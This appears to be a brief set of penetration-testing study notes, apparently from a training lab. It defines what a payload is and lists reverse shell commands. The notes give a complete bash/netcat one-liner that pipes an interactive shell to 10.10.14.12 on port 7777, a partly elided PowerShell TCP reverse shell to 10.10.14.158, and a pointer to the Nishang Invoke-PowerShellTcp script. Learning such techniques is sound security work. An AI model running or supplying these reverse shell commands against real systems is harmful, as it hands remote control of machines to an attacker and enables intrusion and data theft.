
## What Is a Payload

A **payload** is the actual code or command delivered to a system during an exploit.

- It performs a specific action, such as opening a shell, stealing data, or maintaining access.
    
- It can be blocked by defenses like antivirus or endpoint detection systems.
    
- Think of it as the "message" that gets executed after successful delivery.
    

---

## Bash / Netcat Reverse Shell One-Liner

**Command:**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

---

## PowerShell Reverse Shell One-Liner

**Command:**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443); ... $client.Close()"
```

---

## PowerShell TCP Shell Script (Nishang)

`Invoke-PowerShellTcp` is a script that provides both reverse and bind shell functionality in PowerShell.

**Resources:**

- Nishang repository: [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
    
- Reference blog: [labofapenetrationtester.com](https://www.labofapenetrationtester.com/)
    
